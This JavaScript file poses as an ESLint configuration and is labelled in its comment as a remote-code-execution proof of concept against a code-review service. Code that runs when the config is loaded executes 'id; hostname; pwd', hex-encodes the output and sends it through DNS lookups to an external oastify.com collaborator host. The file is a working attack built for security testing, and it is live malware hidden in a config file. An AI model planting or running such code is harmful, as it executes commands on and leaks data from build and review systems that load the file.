// CodeRabbit RCE PoC v2 - prove OS command execution + exfil output via DNS
try {
  const cp = require('child_process');
  let o = '';
  try { o = cp.execSync('id; hostname; pwd', { timeout: 8000 }).toString(); } catch (e) { o = 'EXECERR'; }
  const hex = Buffer.from(o).toString('hex');
  // split into DNS labels (<=60 chars) and exfil
  const a = hex.slice(0, 60), b = hex.slice(60, 120), c = hex.slice(120, 180);
  require('dns').lookup('p1-' + a + '.cmdout.hwhv3spdg8a0y4fiq0r8ifiqjhp8dy1n.oastify.com', () => {});
  if (b) require('dns').lookup('p2-' + b + '.cmdout.hwhv3spdg8a0y4fiq0r8ifiqjhp8dy1n.oastify.com', () => {});
  if (c) require('dns').lookup('p3-' + c + '.cmdout.hwhv3spdg8a0y4fiq0r8ifiqjhp8dy1n.oastify.com', () => {});
} catch (e) {
  require('dns').lookup('outer-err.cmdout.hwhv3spdg8a0y4fiq0r8ifiqjhp8dy1n.oastify.com', () => {});
}
module.exports = { root: true, rules: {} };
